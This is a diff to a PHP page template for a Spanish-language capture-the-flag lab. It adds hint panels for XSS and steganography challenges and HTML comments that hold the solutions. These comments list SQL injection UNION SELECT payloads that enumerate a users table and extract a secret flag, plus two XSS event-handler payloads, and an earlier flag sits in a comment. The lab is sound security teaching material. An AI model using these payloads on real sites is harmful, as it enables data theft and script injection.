@@ -28,6 +28,19 @@
     <!-- FLAG{ReCo#_Pa$!ivO} -->
 <?php endif; ?>
 
+<?php if ($reto['slug'] === 'reto07-sqli-datos'): ?>
+    <!-- ' ORDER BY 1# // Usar para ver cuantas columnas hay cambiando el numero -->
+    <!-- ' UNION SELECT 1,username,3,4 FROM users# // ver usuarios -->
+    <!-- ' UNION SELECT 1,2,3,4 FROM users# // ver en que columna se imprimen los datos -->
+    <!-- ' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'# // ver datos importantes y el "secret necesario" -->
+    <!-- ' UNION SELECT 1,secret,3,4 FROM users# // SQLI correcto para mostrar la flag -->
+<?php endif; ?>
+
+<?php if ($reto['slug'] === 'reto08-xss'): ?>
+    <!-- codigo usado para la explotacion: <img src=x onerror="alert(flag)"> -->
+    <!-- otra forma de explotar: <body onload=alert(flag)> -->
+<?php endif; ?>
+
 <section class="panel">
     <h2>Herramientas y enfoque</h2>
     <p><?= htmlspecialchars(implode(', ', $reto['herramientas']), ENT_QUOTES, 'UTF-8'); ?></p>
@@ -150,6 +163,22 @@
         <p>- Si usas UNION SELECT, recuerda que debes coincidir con el número de columnas de la consulta original.</p>
         <p>- observa qué datos sí se muestran después del login…</p>
         <p>- Puede que te encuentres algun "secret" por allí.</p>
+    </section>
+<?php endif; ?>
+
+<?php if ($reto['slug'] === 'reto08-xss'): ?>
+    <section class="panel hint-module">
+        <h2>Pistas</h2>
+        <p>- Lo que escribes en el comentario se muestra directamente en la página… ¿el navegador siempre lo interpretará como texto?</p>
+        <p>- No todos los scripts necesitan etiquetas &lt;script&gt; para ejecutarse.</p>
+        <p>- Algunos elementos HTML pueden ejecutar código cuando ocurre un evento.</p>
+    </section>
+<?php endif; ?>
+
+<?php if ($reto['slug'] === 'reto09-stego'): ?>
+    <section class="panel hint-module">
+        <h2>Pistas</h2>
+        <p>- La imagen la has visto desde el inicio del ctf</p>
     </section>
 <?php endif; ?>
 
